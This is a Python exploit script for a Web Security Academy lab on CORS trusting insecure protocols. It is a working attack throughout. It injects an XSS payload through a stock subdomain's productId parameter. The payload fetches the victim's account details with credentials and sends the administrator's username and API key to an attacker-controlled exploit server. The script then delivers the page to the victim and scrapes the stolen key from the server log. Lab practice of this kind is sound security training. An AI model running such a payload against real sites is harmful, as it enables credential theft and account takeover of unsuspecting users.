import requests
import sys
import urllib3
import urllib
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Lab Title: CORS vulnerability with trusted insecure protocols
# Error can be check in function returns

proxy_urls = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

# Send /log request to get APIKEY
def get_apikey():
    res = requests.get(k_exploit_server + '/log', proxies=proxy_urls, verify=False)

    if res:
        data = requests.utils.unquote(res.text)
        pattren = re.compile('administrator:(\S*)')
        result = pattren.search(data)

        if result and result.group(1) is not None:
            return result.group(1)
        else:
            return False
    
def main():

    # Xss injection + account APIKEY request + send APIKEY to exploit server
    cors_access = f"<script>location=\"http://stock.{k_lab}/?productId=1<script>fetch('https://{k_lab}/accountDetails',{{credentials:'include'}}).then(res=>res.json()).then(data=>fetch('{k_exploit_server}/exploit/log?key='%2BencodeURIComponent(data.username%2B':'%2Bdata.apikey)))%3C/script>&storeId=1\"</script>"

    payload = {
        'urlIsHttps':'on',
        'responseFile': '/exploit',
        'responseHead': "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        'responseBody': cors_access,
        'formAction':'DELIVER_TO_VICTIM'
    }

    # Send payload to exploit server
    res = requests.post(
        k_exploit_server, 
        data = payload, 
        headers = {'Content-type':'application/x-www-form-urlencoded'},
        proxies = proxy_urls,
        verify = False
        )

    if res:
        api_key = get_apikey()

        if api_key:
            print('APIKEY: ' + api_key)
        else:
            print('[-] Error in getting APIKEY.')
    else:
        print('[-] Error in sending payload to exploit server.')

      
if __name__ == "__main__":
    # User input: Lab URL(s)
    k_lab = input("Enter Lab URL: ").strip().rstrip("/").lstrip("https://")
    k_exploit_server = input("Enter Exploit Server URL: ").strip().rstrip("exploit").rstrip("/")

    if (not (k_lab and k_exploit_server)):
        print()
        print("[-] Error! Input URL(s) missing.")
        print("[-] Lab URL: https://a...........c2.web-security-academy.net")
        print("[-] Exploit Server URL: https://exploit-a...........c2.web-security-academy.net/exploit")
        sys.exit()
    else:
        main()